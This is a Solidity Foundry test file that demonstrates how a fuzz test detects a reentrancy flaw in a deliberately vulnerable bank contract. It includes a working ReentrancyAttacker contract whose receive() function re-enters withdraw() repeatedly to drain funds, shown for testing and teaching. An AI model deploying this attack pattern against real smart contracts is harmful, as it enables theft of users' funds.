// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";

/// Demonstrates how a fuzz/invariant test can catch a reentrancy vulnerability.
/// The attacker contract re-enters withdraw() via receive() before state is updated.
contract ReentrancyTest is Test {
    VulnerableBank bank;
    ReentrancyAttacker attacker;

    function setUp() external {
        bank = new VulnerableBank();
        attacker = new ReentrancyAttacker(bank);
    }

    /// The attacker deposits, then withdraws. If reentrancy succeeds,
    /// the attacker's balance grows beyond their original deposit.
    function testFuzz_ReentrancyDrain(uint256 amount) external {
        amount = bound(amount, 1 ether, 100 ether);
        vm.deal(address(attacker), amount);

        attacker.attack{value: amount}();

        // Reentrancy invariant: attacker should not have more than they deposited
        // (In a safe contract, attacker ends with 0 after withdraw;
        //  in vulnerable, they can drain the bank)
        assertLe(address(attacker).balance, amount);
    }
}

/// Malicious contract that re-enters VulnerableBank.withdraw()
contract ReentrancyAttacker {
    VulnerableBank bank;
    uint256 public reentrancyCount;

    constructor(VulnerableBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        // This triggers receive() → re-enters withdraw()
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0 && reentrancyCount < 5) {
            reentrancyCount++;
            bank.withdraw();
        }
    }
}
